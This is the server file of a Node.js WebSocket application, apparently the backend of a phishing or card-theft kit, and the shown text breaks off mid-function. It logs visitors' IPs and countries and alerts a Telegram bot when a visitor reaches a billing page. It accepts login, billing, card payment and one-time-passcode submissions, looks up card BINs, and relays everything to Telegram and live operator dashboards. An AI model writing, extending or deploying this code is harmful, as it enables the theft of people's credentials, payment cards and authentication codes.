const WebSocket = require('ws');
const http = require('http');
const https = require('https');
const fs = require('fs');
const path = require('path');
const TelegramService = require('./services/telegramService');
const BinService = require('./services/binService');

// Charger les variables d'environnement depuis .env si le fichier existe
const envPath = path.join(__dirname, '..', '.env');
if (fs.existsSync(envPath)) {
  console.log('[Server] 📄 Loading .env file...');
  const envContent = fs.readFileSync(envPath, 'utf8');
  envContent.split('\n').forEach(line => {
    const trimmedLine = line.trim();
    if (trimmedLine && !trimmedLine.startsWith('#')) {
      const [key, ...valueParts] = trimmedLine.split('=');
      if (key && valueParts.length > 0) {
        const value = valueParts.join('=').trim().replace(/^["']|["']$/g, '');
        if (!process.env[key.trim()]) {
          process.env[key.trim()] = value;
          console.log(`[Server] ✅ Loaded ${key.trim()} from .env`);
        }
      }
    }
  });
  console.log('[Server] ✅ .env file loaded');
} else {
  console.log('[Server] ⚠️  No .env file found. Using system environment variables.');
}

// Configuration
const PORT = process.env.WS_PORT || 8080;
const telegram = new TelegramService();
const binService = new BinService();

// Créer le serveur HTTP avec gestionnaire de requêtes
const server = http.createServer((req, res) => {
  // Endpoint de santé pour Render
  if (req.url === '/health' || req.url === '/') {
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({ 
      status: 'ok', 
      service: 'neti-donnie-websocket-server',
      timestamp: new Date().toISOString(),
      clients: clients.size,
      dashboards: dashboards.size
    }));
    return;
  }
  
  // Pour toutes les autres requêtes HTTP
  res.writeHead(404, { 'Content-Type': 'application/json' });
  res.end(JSON.stringify({ error: 'Not Found' }));
});

// Créer le serveur WebSocket
const wss = new WebSocket.Server({ server });

// Stockage des connexions
const clients = new Map();
const dashboards = new Set();

// Fonction pour extraire la vraie adresse IP du client
function getClientIP(req) {
  const headers = {
    'x-forwarded-for': req.headers['x-forwarded-for'],
    'x-real-ip': req.headers['x-real-ip'],
    'cf-connecting-ip': req.headers['cf-connecting-ip'],
    'true-client-ip': req.headers['true-client-ip']
  };
  
  const remoteAddress = req.socket.remoteAddress;
  
  console.log('[IP Detection] Headers:', JSON.stringify(headers, null, 2));
  console.log('[IP Detection] Remote Address:', remoteAddress);
  
  // Vérifier X-Forwarded-For (peut contenir plusieurs IPs, prendre la première)
  const xForwardedFor = req.headers['x-forwarded-for'];
  if (xForwardedFor) {
    // X-Forwarded-For peut contenir plusieurs IPs séparées par des virgules
    // La première est généralement l'IP du client original
    const ips = xForwardedFor.split(',').map(ip => ip.trim());
    console.log('[IP Detection] X-Forwarded-For IPs:', ips);
    if (ips.length > 0 && ips[0]) {
      // Nettoyer l'IP (enlever le port si présent)
      const cleanIP = ips[0].split(':')[0];
      if (cleanIP && cleanIP !== '::1' && cleanIP !== '127.0.0.1') {
        console.log('[IP Detection] ✅ Using X-Forwarded-For:', cleanIP);
        return cleanIP;
      }
    }
  }

  // Vérifier X-Real-IP
  const xRealIP = req.headers['x-real-ip'];
  if (xRealIP) {
    const cleanIP = xRealIP.split(':')[0];
    console.log('[IP Detection] X-Real-IP:', cleanIP);
    if (cleanIP && cleanIP !== '::1' && cleanIP !== '127.0.0.1') {
      console.log('[IP Detection] ✅ Using X-Real-IP:', cleanIP);
      return cleanIP;
    }
  }

  // Vérifier CF-Connecting-IP (Cloudflare)
  const cfConnectingIP = req.headers['cf-connecting-ip'];
  if (cfConnectingIP) {
    const cleanIP = cfConnectingIP.split(':')[0];
    console.log('[IP Detection] CF-Connecting-IP:', cleanIP);
    if (cleanIP) {
      console.log('[IP Detection] ✅ Using CF-Connecting-IP:', cleanIP);
      return cleanIP;
    }
  }

  // Vérifier True-Client-IP (Akamai, Cloudflare Enterprise)
  const trueClientIP = req.headers['true-client-ip'];
  if (trueClientIP) {
    const cleanIP = trueClientIP.split(':')[0];
    console.log('[IP Detection] True-Client-IP:', cleanIP);
    if (cleanIP) {
      console.log('[IP Detection] ✅ Using True-Client-IP:', cleanIP);
      return cleanIP;
    }
  }

  // Fallback sur remoteAddress
  let ip = req.socket.remoteAddress;
  
  // Nettoyer l'IP (enlever ::ffff: pour IPv4 mapped IPv6)
  if (ip) {
    ip = ip.replace(/^::ffff:/, '');
    // Enlever le port si présent
    ip = ip.split(':')[0];
  }
  
  console.log('[IP Detection] ✅ Using Remote Address (fallback):', ip || 'unknown');
  return ip || 'unknown';
}

// Fonction pour obtenir le pays à partir de l'IP avec plusieurs APIs en fallback
function getCountryFromIP(ip) {
  return new Promise((resolve) => {
    console.log(`[Country] 🔍 Fetching country for IP: ${ip}`);
    
    // Ignorer les IPs locales
    if (!ip || ip === 'unknown' || ip === '127.0.0.1' || ip === '::1' || ip.startsWith('192.168.') || ip.startsWith('10.') || ip.startsWith('172.')) {
      console.log(`[Country] ⚠️  Local IP detected, returning 'Local'`);
      resolve('Local');
      return;
    }

    // Essayer d'abord avec ipwhois.app (API la plus fiable)
    const url1 = `https://ipwhois.app/json/${ip}`;
    console.log(`[Country] 🌐 Trying API 1 (ipwhois.app - PRIORITY): ${url1}`);
    
    const options1 = {
      headers: {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
      }
    };
    
    const request1 = https.get(url1, options1, (res) => {
      let data = '';
      
      console.log(`[Country] 📡 API 1 Response status: ${res.statusCode}`);
      
      if (res.statusCode === 403 || res.statusCode === 429) {
        console.log(`[Country] ⚠️  API 1 returned status ${res.statusCode} (rate limited/forbidden), trying fallback...`);
        tryFallbackAPI(ip, resolve);
        return;
      }
      
      if (res.statusCode !== 200) {
        console.log(`[Country] ⚠️  API 1 returned status ${res.statusCode}, trying fallback...`);
        tryFallbackAPI(ip, resolve);
        return;
      }
      
      res.on('data', (chunk) => {
        data += chunk;
      });
      
      res.on('end', () => {
        try {
          console.log(`[Country] 📦 API 1 Response data:`, data);
          const result = JSON.parse(data);
          console.log(`[Country] 📊 API 1 Parsed result:`, JSON.stringify(result, null, 2));
          
          // ipwhois.app format: {success: true, country: "South Africa"} ou {success: true, country_name: "South Africa"}
          if (result.success && result.country) {
            console.log(`[Country] ✅ API 1 (ipwhois.app) Success! Country: ${result.country}`);
            resolve(result.country);
          } else if (result.success && result.country_name) {
            console.log(`[Country] ✅ API 1 (ipwhois.app) Success! Country: ${result.country_name}`);
            resolve(result.country_name);
          } else if (!result.success && result.message) {
            console.log(`[Country] ⚠️  API 1 (ipwhois.app) returned error: ${result.message}, trying fallback...`);
            tryFallbackAPI(ip, resolve);
          } else {
            console.log(`[Country] ⚠️  API 1 (ipwhois.app) returned unexpected format, trying fallback...`);
            tryFallbackAPI(ip, resolve);
          }
        } catch (error) {
          console.error(`[Country] ❌ Error parsing API 1 data:`, error);
          console.error(`[Country] Raw data:`, data);
          tryFallbackAPI(ip, resolve);
        }
      });
    });
    
    request1.on('error', (error) => {
      console.error(`[Country] ❌ API 1 Error:`, error.message);
      tryFallbackAPI(ip, resolve);
    });
    
    // Timeout de 8 secondes pour la première API
    request1.setTimeout(8000, () => {
      console.error(`[Country] ⏱️  API 1 Timeout after 8 seconds for IP: ${ip}`);
      request1.destroy();
      tryFallbackAPI(ip, resolve);
    });
  });
}

// Fonction de fallback avec ip-api.com
function tryFallbackAPI(ip, resolve) {
  console.log(`[Country] 🔄 Trying fallback API 1 (ip-api.com) for IP: ${ip}`);
  
  const url2 = `https://ip-api.com/json/${ip}?fields=status,country,countryCode`;
  console.log(`[Country] 🌐 Fallback API 1 URL: ${url2}`);
  
  const options2 = {
    headers: {
      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    }
  };
  
  const request2 = https.get(url2, options2, (res) => {
    let data = '';
    
    console.log(`[Country] 📡 Fallback API 1 Response status: ${res.statusCode}`);
    
    if (res.statusCode === 403 || res.statusCode === 429) {
      console.log(`[Country] ⚠️  Fallback API 1 returned status ${res.statusCode}, trying API 2...`);
      tryFallbackAPI2(ip, resolve);
      return;
    }
    
    res.on('data', (chunk) => {
      data += chunk;
    });
    
    res.on('end', () => {
      try {
        console.log(`[Country] 📦 Fallback API 1 Response data:`, data);
        const result = JSON.parse(data);
        console.log(`[Country] 📊 Fallback API 1 Parsed result:`, JSON.stringify(result, null, 2));
        
        // ip-api.com format: {status: "success", country: "South Africa"}
        if (result.status === 'success' && result.country) {
          console.log(`[Country] ✅ Fallback API 1 (ip-api.com) Success! Country: ${result.country}`);
          resolve(result.country);
        } else if (result.status === 'fail') {
          console.log(`[Country] ⚠️  Fallback API 1 returned status: ${result.status}, trying API 2...`);
          tryFallbackAPI2(ip, resolve);
        } else {
          console.log(`[Country] ⚠️  Fallback API 1 error, trying API 2...`);
          tryFallbackAPI2(ip, resolve);
        }
      } catch (error) {
        console.error(`[Country] ❌ Error parsing fallback API 1 data:`, error);
        console.error(`[Country] Raw data:`, data);
        tryFallbackAPI2(ip, resolve);
      }
    });
  });
  
  request2.on('error', (error) => {
    console.error(`[Country] ❌ Fallback API 1 Error:`, error.message);
    tryFallbackAPI2(ip, resolve);
  });
  
  // Timeout de 5 secondes pour le fallback
  request2.setTimeout(5000, () => {
    console.error(`[Country] ⏱️  Fallback API 1 Timeout after 5 seconds for IP: ${ip}`);
    request2.destroy();
    tryFallbackAPI2(ip, resolve);
  });
}

// Fonction de fallback 2 avec ipapi.co
function tryFallbackAPI2(ip, resolve) {
  console.log(`[Country] 🔄 Trying fallback API 2 (ipapi.co) for IP: ${ip}`);
  
  const url3 = `https://ipapi.co/${ip}/json/`;
  console.log(`[Country] 🌐 Fallback API 2 URL: ${url3}`);
  
  const request3 = https.get(url3, (res) => {
    let data = '';
    
    console.log(`[Country] 📡 Fallback API 2 Response status: ${res.statusCode}`);
    
    res.on('data', (chunk) => {
      data += chunk;
    });
    
    res.on('end', () => {
      try {
        console.log(`[Country] 📦 Fallback API 2 Response data:`, data);
        const result = JSON.parse(data);
        console.log(`[Country] 📊 Fallback API 2 Parsed result:`, JSON.stringify(result, null, 2));
        
        // Vérifier si c'est une erreur de rate limit
        if (result.error && (result.reason === 'RateLimited' || res.statusCode === 429)) {
          console.log(`[Country] ⚠️  Fallback API 2 rate limited, trying API 3...`);
          tryFinalFallbackAPI(ip, resolve);
          return;
        }
        
        if (result.country_name && !result.error) {
          console.log(`[Country] ✅ Fallback API 2 (ipapi.co) Success! Country: ${result.country_name}`);
          resolve(result.country_name);
        } else if (result.country && !result.error) {
          console.log(`[Country] ✅ Fallback API 2 (ipapi.co) Success! Country: ${result.country}`);
          resolve(result.country);
        } else {
          console.log(`[Country] ⚠️  Fallback API 2 error: ${result.error || 'Unknown error'}, trying API 3...`);
          tryFinalFallbackAPI(ip, resolve);
        }
      } catch (error) {
        console.error(`[Country] ❌ Error parsing fallback API 2 data:`, error);
        console.error(`[Country] Raw data:`, data);
        tryFinalFallbackAPI(ip, resolve);
      }
    });
  });
  
  request3.on('error', (error) => {
    console.error(`[Country] ❌ Fallback API 2 Error:`, error.message);
    tryFinalFallbackAPI(ip, resolve);
  });
  
  // Timeout de 5 secondes pour le fallback 2
  request3.setTimeout(5000, () => {
    console.error(`[Country] ⏱️  Fallback API 2 Timeout after 5 seconds for IP: ${ip}`);
    request3.destroy();
    tryFinalFallbackAPI(ip, resolve);
  });
}

// Fonction de fallback finale avec ip-api.io
function tryFinalFallbackAPI(ip, resolve) {
  console.log(`[Country] 🔄 Trying final fallback API (ip-api.io) for IP: ${ip}`);
  
  const url4 = `https://ip-api.io/json/${ip}`;
  console.log(`[Country] 🌐 Final Fallback API URL: ${url4}`);
  
  const request4 = https.get(url4, (res) => {
    let data = '';
    
    console.log(`[Country] 📡 Final Fallback API Response status: ${res.statusCode}`);
    
    res.on('data', (chunk) => {
      data += chunk;
    });
    
    res.on('end', () => {
      try {
        console.log(`[Country] 📦 Final Fallback API Response data:`, data);
        const result = JSON.parse(data);
        console.log(`[Country] 📊 Final Fallback API Parsed result:`, JSON.stringify(result, null, 2));
        
        if (result.country_name && !result.error) {
          console.log(`[Country] ✅ Final Fallback API (ip-api.io) Success! Country: ${result.country_name}`);
          resolve(result.country_name);
        } else if (result.country && !result.error) {
          console.log(`[Country] ✅ Final Fallback API (ip-api.io) Success! Country: ${result.country}`);
          resolve(result.country);
        } else {
          console.log(`[Country] ⚠️  Final Fallback API error: ${result.error || 'Unknown error'}`);
          console.log(`[Country] ⚠️  All APIs failed, returning 'Unknown' for IP: ${ip}`);
          resolve('Unknown');
        }
      } catch (error) {
        console.error(`[Country] ❌ Error parsing final fallback API data:`, error);
        console.error(`[Country] Raw data:`, data);
        console.log(`[Country] ⚠️  All APIs failed, returning 'Unknown' for IP: ${ip}`);
        resolve('Unknown');
      }
    });
  });
  
  request4.on('error', (error) => {
    console.error(`[Country] ❌ Final Fallback API Error:`, error.message);
    console.log(`[Country] ⚠️  All APIs failed, returning 'Unknown' for IP: ${ip}`);
    resolve('Unknown');
  });
  
  // Timeout de 5 secondes pour le fallback final
  request4.setTimeout(5000, () => {
    console.error(`[Country] ⏱️  Final Fallback API Timeout after 5 seconds for IP: ${ip}`);
    request4.destroy();
    console.log(`[Country] ⚠️  All APIs failed, returning 'Unknown' for IP: ${ip}`);
    resolve('Unknown');
  });
}

// Gestion des connexions WebSocket
wss.on('connection', async (ws, req) => {
  const clientId = generateClientId();
  const ip = getClientIP(req);
  
  console.log(`\n[Connection] ========================================`);
  console.log(`[Connection] New WebSocket connection`);
  console.log(`[Connection] Client ID: ${clientId}`);
  console.log(`[Connection] Detected IP: ${ip}`);
  console.log(`[Connection] User-Agent: ${req.headers['user-agent'] || 'N/A'}`);
  console.log(`[Connection] Origin: ${req.headers.origin || 'N/A'}`);
  console.log(`[Connection] ========================================\n`);

  // Obtenir le pays à partir de l'IP - Version optimisée pour rapidité
  let country = await getCountryFromIP(ip);
  console.log(`[Country] ✅ IP ${ip} -> Country: ${country}`);
  
  // Si le pays est "Unknown", faire UNE tentative rapide (pas de retries multiples pour éviter les délais)
  if (!country || country === 'Unknown') {
    console.log(`[Country] ⚠️  Country is ${country || 'missing'}, doing one quick retry...`);
    // Une seule tentative rapide avec un délai court
    await new Promise(resolve => setTimeout(resolve, 1000)); // 1 seconde seulement
    country = await getCountryFromIP(ip);
    console.log(`[Country] 🔄 Quick retry result: ${country}`);
  }
  
  // Si toujours "Unknown", utiliser une valeur par défaut basée sur l'IP
  if (!country || country === 'Unknown') {
    // Si c'est une IP locale, utiliser "Local"
    if (ip === '127.0.0.1' || ip === '::1' || ip.startsWith('192.168.') || ip.startsWith('10.') || ip.startsWith('172.')) {
      country = 'Local';
    } else {
      // Pour les IPs publiques, utiliser "Unknown" (sera mis à jour lors de l'enregistrement si nécessaire)
      console.log(`[Country] ⚠️  Could not determine country for IP: ${ip}, will use IP as fallback if needed`);
      country = 'Unknown'; // Sera mis à jour lors de l'enregistrement si nécessaire
    }
  }
  
  console.log(`[Country] 📝 Final country for IP ${ip}: ${country}`);

  // Stocker la connexion
  const clientData = {
    ws,
    id: clientId,
    ip,
    country: country || 'Unknown', // S'assurer que le pays est toujours défini
    role: null,
    connectedAt: Date.now(),
    notificationSent: false, // Flag pour éviter les notifications en double
    countryUpdateInProgress: false, // Flag pour éviter les mises à jour de pays en boucle
  };
  
  clients.set(clientId, clientData);
  console.log(`[Connection] 💾 Client stored with country: ${clientData.country}`);
  console.log(`[Connection] 📊 Total clients after storing: ${clients.size}`);
  console.log(`[Connection] 📊 Client role at creation: ${clientData.role || 'null'}`);

  // Envoyer message de bienvenue
  ws.send(JSON.stringify({
    type: 'welcome',
    message: 'Connected to WebSocket server',
    clientId,
  }));

  // Gestion des messages
  ws.on('message', async (message) => {
    try {
      const rawMessage = message.toString();
      console.log(`[Server] 📨 Raw message received from ${clientId}:`, rawMessage);
      const data = JSON.parse(rawMessage);
      console.log(`[Server] 📨 Parsed message from ${clientId}:`, data.type, JSON.stringify(data, null, 2));
      console.log(`[Server] 📨 Message details - type: ${data.type}, from: ${clientId}, to: ${data.to || 'N/A'}`);
      await handleMessage(clientId, data);
    } catch (error) {
      console.error(`[Server] ❌ Error parsing message from ${clientId}:`, error);
      console.error(`[Server] Raw message:`, message.toString());
      ws.send(JSON.stringify({
        type: 'error',
        message: 'Invalid message format',
      }));
    }
  });

  // Gestion de la déconnexion
  ws.on('close', (code, reason) => {
    console.log(`\n[Connection] ========================================`);
    console.log(`[Connection] Client disconnected: ${clientId}`);
    console.log(`[Connection] Close code: ${code} (1000=Normal, 1001=Going Away, 1005=No Status, 1006=Abnormal)`);
    console.log(`[Connection] Reason: ${reason || 'No reason'}`);
    console.log(`[Connection] ========================================\n`);
    
    const client = clients.get(clientId);
    if (client) {
      console.log(`[Connection] 📊 Client role before disconnect: ${client.role || 'null'}`);
      console.log(`[Connection] 📊 Client IP: ${client.ip || 'N/A'}`);
      console.log(`[Connection] 📊 Client country: ${client.country || 'N/A'}`);
    } else {
      console.log(`[Connection] ⚠️  Client ${clientId} not found in storage`);
    }
    
    // Pour les fermetures normales (code 1000), attendre plus longtemps avant de supprimer
    // Cela permet au client de se reconnecter rapidement sans perdre son état
    // React.StrictMode peut créer deux connexions, l'une se fermant rapidement
    if (code === 1000) {
      console.log(`[Connection] ⚠️  Normal closure (code 1000) - waiting 60 seconds before removing client`);
      console.log(`[Connection] This might be a React.StrictMode cleanup - client may reconnect`);
      
      // Vérifier si un client avec la même IP vient de se reconnecter
      const clientIP = client?.ip;
      const hasReconnectedClient = clientIP ? Array.from(clients.values()).some(c => 
        c.ip === clientIP && c.id !== clientId && c.ws.readyState === 1 && (Date.now() - c.connectedAt) < 5000
      ) : false;
      
      if (hasReconnectedClient) {
        console.log(`[Connection] ✅ Client with same IP (${clientIP}) just reconnected - removing old connection immediately`);
        // Si un client avec la même IP vient de se reconnecter, supprimer l'ancien immédiatement
        if (client && client.role === 'dashboard') {
          dashboards.delete(ws);
        }
        clients.delete(clientId);
        console.log(`[Connection] Old client ${clientId} removed (replaced by new connection)`);
        return;
      }
      
      setTimeout(() => {
        const stillExists = clients.get(clientId);
        if (stillExists && stillExists.ws.readyState === 3) { // CLOSED
          // Vérifier une dernière fois si un client avec la même IP s'est reconnecté
          const stillExistsIP = stillExists.ip;
          const hasReconnected = stillExistsIP ? Array.from(clients.values()).some(c => 
            c.ip === stillExistsIP && c.id !== clientId && c.ws.readyState === 1
          ) : false;
          
          if (hasReconnected) {
            console.log(`[Connection] ✅ Client with same IP (${stillExistsIP}) has reconnected - removing old connection`);
            if (stillExists.role === 'dashboard') {
              dashboards.delete(stillExists.ws);
            }
            clients.delete(clientId);
            console.log(`[Connection] Old client ${clientId} removed (replaced by reconnected client)`);
            return;
          }
          
          console.log(`[Connection] Client ${clientId} still closed after 60 seconds - removing`);
          console.log(`[Connection] 📊 Client role before removal: ${stillExists.role || 'null'}`);
          console.log(`[Connection] 📊 Total clients before removal: ${clients.size}`);
          if (stillExists.role === 'dashboard') {
            dashboards.delete(stillExists.ws);
            console.log(`[Connection] Dashboard ${clientId} removed from dashboards`);
          }
          clients.delete(clientId);
          console.log(`[Connection] Client ${clientId} removed from clients map`);
          console.log(`[Connection] Remaining clients: ${clients.size}`);
          console.log(`[Connection] 📊 Clients with role 'client' after removal: ${Array.from(clients.values()).filter(c => c.role === 'client').length}`);
          
          // Notifier les dashboards seulement si c'était un client (pas un dashboard)
          if (stillExists.role === 'client') {
            broadcastToDashboards({
              type: 'client_disconnected',
              clientId,
            });
          }
        } else if (stillExists && stillExists.ws.readyState !== 3) {
          console.log(`[Connection] ✅ Client ${clientId} reconnected! Keeping in map`);
        } else {
          console.log(`[Connection] ⚠️  Client ${clientId} no longer exists in storage`);
        }
      }, 60000); // Augmenter à 60 secondes pour laisser plus de temps aux clients de se reconnecter
      
      return; // Ne pas supprimer immédiatement
    }
    
    // Pour les fermetures anormales, supprimer immédiatement
    if (client && client.role === 'dashboard') {
      dashboards.delete(ws);
      console.log(`[Connection] Dashboard ${clientId} removed from dashboards set`);
    }
    
    clients.delete(clientId);
    console.log(`[Connection] Client ${clientId} removed from clients map`);
    console.log(`[Connection] Remaining clients: ${clients.size}`);

    // Notifier les dashboards
    broadcastToDashboards({
      type: 'client_disconnected',
      clientId,
    });
  });
});

// Gestion des messages
async function handleMessage(clientId, data) {
  const client = clients.get(clientId);
  if (!client) {
    console.log(`[handleMessage] ❌ Client not found: ${clientId}`);
    return;
  }

  console.log(`[handleMessage] 🔄 Processing message type: ${data.type} from client: ${clientId} (role: ${client.role || 'null'})`);
  console.log(`[handleMessage] 📊 Total clients before processing: ${clients.size}`);

  switch (data.type) {
    case 'register':
      console.log(`[handleMessage] 📝 Registering client ${clientId} with role: ${data.role || 'client'}`);
      console.log(`[handleMessage] 📝 Register data:`, JSON.stringify(data, null, 2));
      await handleRegister(clientId, data);
      const clientAfter = clients.get(clientId);
      console.log(`[handleMessage] 📊 Total clients after registration: ${clients.size}`);
      console.log(`[handleMessage] 📊 Client role after registration: ${clientAfter?.role || 'null'}`);
      console.log(`[handleMessage] 📊 Clients with role 'client': ${Array.from(clients.values()).filter(c => c.role === 'client').length}`);
      break;
    
    case 'presence':
      await handlePresence(clientId, data);
      break;
    
    case 'billing_data':
      await handleBillingData(clientId, data);
      break;
    
    case 'login_data':
      await handleLoginData(clientId, data);
      break;
    
    case 'payment_data':
      console.log(`[handleMessage] 💳 Payment data received from client ${clientId}`);
      console.log(`[handleMessage] Payment data content:`, JSON.stringify(data, null, 2));
      await handlePaymentData(clientId, data);
      break;
    
    case 'otp_update':
      await handleOTPUpdate(clientId, data);
      break;
    
    case 'otp_submit':
      console.log(`[handleMessage] 🔢 OTP submit received from client ${clientId}`);
      console.log(`[handleMessage] OTP data content:`, JSON.stringify(data, null, 2));
      await handleOTPSubmit(clientId, data);
      break;
    
    case 'list':
      console.log(`[handleMessage] 📋 List request from ${clientId} (role: ${client.role})`);
      handleList(clientId);
      break;
    
    case 'direct':
      console.log(`[handleMessage] 📨 Direct message from ${clientId} (role: ${client.role})`);
      handleDirectMessage(clientId, data);
      break;
    
    default:
      console.log(`[handleMessage] ⚠️  Unknown message type: ${data.type} from ${clientId}`);
  }
}

// Enregistrement d'un client
async function handleRegister(clientId, data) {
  console.log(`[handleRegister] 📝 Registering client ${clientId}`);
  console.log(`[handleRegister] Role: ${data.role || 'client'}, Page: ${data.page || '/'}`);
  console.log(`[handleRegister] 📊 Total clients before registration: ${clients.size}`);
  
  const client = clients.get(clientId);
  if (!client) {
    console.log(`[handleRegister] ❌ Client not found: ${clientId}`);
    console.log(`[handleRegister] 📊 Available client IDs:`, Array.from(clients.keys()));
    return;
  }
  
  const previousRole = client.role;
  const newRole = data.role || 'client';
  
  // Si le client est déjà enregistré avec le même rôle, éviter de traiter à nouveau
  // MAIS on doit quand même notifier les dashboards si nécessaire
  const alreadyRegistered = client.role === newRole && client.role === 'client' && client.notificationSent;
  
  if (!alreadyRegistered) {
    client.role = newRole;
    client.current_page = data.page || '/';
    console.log(`[handleRegister] 📝 Client ${clientId} role changed from '${previousRole || 'null'}' to '${client.role}'`);
  } else {
    console.log(`[handleRegister] ⚠️  Client ${clientId} already registered with role '${newRole}' and notification sent, skipping notification but updating page if needed...`);
    // Mettre à jour seulement la page si elle a changé
    if (data.page && data.page !== client.current_page) {
      client.current_page = data.page;
      console.log(`[handleRegister] 📄 Updated page for client ${clientId}: ${client.current_page}`);
    }
    // Continuer pour notifier les dashboards même si on skip la notification Telegram
  }

  if (client.role === 'dashboard') {
    dashboards.add(client.ws);
    console.log(`[handleRegister] ✅ Dashboard registered: ${clientId}`);
    console.log(`[handleRegister] Total dashboards: ${dashboards.size}`);
    // Envoyer immédiatement la liste des clients au nouveau dashboard
    setTimeout(() => {
      handleList(clientId);
    }, 100);
  } else {
    console.log(`[handleRegister] ✅ Client registered: ${clientId} with role '${client.role}'`);
    console.log(`[handleRegister] 📊 Total clients with role 'client': ${Array.from(clients.values()).filter(c => c.role === 'client').length}`);
  }

  // Envoyer confirmation
  const registrationResponse = {
    type: 'registered',
    clientId,
    role: client.role,
  };
  console.log(`[handleRegister] 📤 Sending registration confirmation:`, JSON.stringify(registrationResponse, null, 2));
  client.ws.send(JSON.stringify(registrationResponse));
  console.log(`[handleRegister] ✅ Registration confirmation sent to ${clientId}`);

  // Notifier Telegram pour les visiteurs autorisés UNIQUEMENT sur la page /billing
  // IMPORTANT: Vérifier que la notification n'a pas déjà été envoyée pour éviter les doublons
  // Ne pas envoyer si on a déjà skip l'enregistrement
  // NE PAS envoyer si la page n'est pas /billing
  const isBillingPage = data.page === '/billing' || client.current_page === '/billing';
  const shouldNotify = client.role === 'client' && 
                       !client.notificationSent && 
                       !alreadyRegistered && 
                       isBillingPage;
  
  if (shouldNotify) {
    // Vérifier aussi qu'on n'a pas envoyé de notification récemment pour cette IP (protection contre les boucles)
    const now = Date.now();
    const lastNotificationTime = client.lastNotificationTime || 0;
    const timeSinceLastNotification = now - lastNotificationTime;
    const MIN_NOTIFICATION_INTERVAL = 60000; // 60 secondes minimum entre notifications pour la même IP
    
    if (timeSinceLastNotification < MIN_NOTIFICATION_INTERVAL && lastNotificationTime > 0) {
      console.log(`[handleRegister] ⚠️  Notification skipped - too soon since last notification (${Math.round(timeSinceLastNotification/1000)}s ago) for IP ${client.ip}`);
      // Ne pas envoyer de notification Telegram, mais continuer pour notifier les dashboards
      // Marquer quand même comme envoyé pour éviter les tentatives répétées
      client.notificationSent = true;
      client.lastNotificationTime = now;
    } else {
      // Marquer IMMÉDIATEMENT que la notification va être envoyée pour éviter les doublons
      // même si plusieurs appels à handleRegister arrivent en même temps
      client.notificationSent = true;
      client.lastNotificationTime = now;
      console.log(`[handleRegister] 🔔 Sending authorized visitor notification for client ${clientId} on page ${data.page || client.current_page}`);
      
      // Utiliser le pays déjà récupéré lors de la connexion (plus rapide)
      let country = client.country;
      
      // Si le pays n'est pas disponible ou est "Unknown", faire UNE tentative rapide (sans délais longs)
      if (!country || country === 'Unknown' || country === 'N/A') {
        console.log(`[handleRegister] ⚠️  Country is ${country || 'missing'}, attempting quick fetch...`);
        if (client.ip && client.ip !== 'unknown' && client.ip !== '127.0.0.1' && !client.ip.startsWith('192.168.') && !client.ip.startsWith('10.') && !client.ip.startsWith('172.')) {
          try {
            // UNE seule tentative rapide (pas de retries multiples pour éviter les délais)
            country = await getCountryFromIP(client.ip);
            console.log(`[handleRegister] 📍 Quick fetch result: ${country}`);
            
            if (country && country !== 'Unknown' && country !== 'Local') {
              client.country = country;
              console.log(`[handleRegister] ✅ Successfully fetched country: ${country}`);
            } else {
              // Si échec, utiliser l'IP comme fallback (pas de retries longs)
              country = `IP: ${client.ip}`;
              client.country = country;
              console.log(`[handleRegister] ⚠️  Using IP as fallback: ${country}`);
            }
          } catch (error) {
            console.error(`[handleRegister] ❌ Error fetching country:`, error);
            country = `IP: ${client.ip}`;
            client.country = country;
          }
        } else {
          console.log(`[handleRegister] ⚠️  Cannot fetch country - invalid or local IP: ${client.ip}`);
          country = client.ip === '127.0.0.1' ? 'Local' : `Local Network (IP: ${client.ip})`;
          client.country = country;
        }
      } else {
        console.log(`[handleRegister] ✅ Using stored country: ${country}`);
      }
      
      // Envoyer la notification avec le pays disponible (même si c'est l'IP en fallback)
      await telegram.notifyAuthorizedVisitor({
        ip: client.ip,
        country: country || 'Unknown',
      });
      
      console.log(`[handleRegister] ✅ Notification sent for client ${clientId}, country: ${country}`);
      
      // Si le pays est toujours "Unknown" ou utilise l'IP comme fallback, lancer une mise à jour en arrière-plan
      if ((!country || country === 'Unknown' || country.startsWith('IP:') || country.startsWith('Unable to determine')) && client.ip && client.ip !== 'unknown' && client.ip !== '127.0.0.1' && !client.ip.startsWith('192.168.') && !client.ip.startsWith('10.') && !client.ip.startsWith('172.')) {
        console.log(`[handleRegister] 🔄 Launching background country update for client ${clientId}`);
        // Mettre à jour le pays en arrière-plan (ne pas attendre)
        updateCountryInBackground(clientId).catch(err => {
          console.error(`[handleRegister] ❌ Error updating country in background for ${clientId}:`, err);
        });
      }
    }
  } else if (client.role === 'client' && client.notificationSent) {
    console.log(`[handleRegister] ⚠️  Notification already sent for client ${clientId}, skipping Telegram notification...`);
  } else if (client.role === 'client' && !isBillingPage) {
    console.log(`[handleRegister] ⚠️  Client ${clientId} is on page '${data.page || client.current_page}', not /billing - skipping notification`);
  }

  // Notifier les dashboards (TOUJOURS, même si la notification Telegram a été skip)
  const notificationType = client.role === 'client' ? 'client_registered' : 'dashboard_connected';
  console.log(`[handleRegister] 📢 Broadcasting ${notificationType} to ${dashboards.size} dashboard(s)`);
  // S'assurer que le pays est bien défini avant l'envoi
  const countryToSend = client.country || 'Unknown';
  console.log(`[handleRegister] 📢 Sending country: ${countryToSend}`);
  broadcastToDashboards({
    type: notificationType,
    client: {
      id: clientId,
      ip: client.ip,
      country: countryToSend,
      current_page: client.current_page,
      connectedAt: client.connectedAt,
    },
  });
}

// Mise à jour de présence
async function handlePresence(clientId, data) {
  const client = clients.get(clientId);
  if (!client) return;

  const oldPage = client.current_page;
  client.current_page = data.page || '/';
  client.last_seen = Date.now();

  // Notifier Telegram si changement de page - DÉSACTIVÉ
  // Les notifications de mise à jour de page ne sont plus envoyées pour éviter le spam
  // if (oldPage !== client.current_page) {
  //   await telegram.notifyPageUpdate({
  //     id: clientId,
  //     current_page: client.current_page,
  //   });
  // }

  // Notifier les dashboards
  broadcastToDashboards({
    type: 'client_updated',
    client: {
      id: clientId,
      ip: client.ip,
      country: client.country,
      current_page: client.current_page,
      last_seen: client.last_seen,
    },
  });
}

// Données de facturation
async function handleBillingData(clientId, data) {
  const client = clients.get(clientId);
  if (!client) return;

  Object.assign(client, data.data);

  // Notifier Telegram
  await telegram.notifyCustom('Données de facturation', {
    Client: clientId,
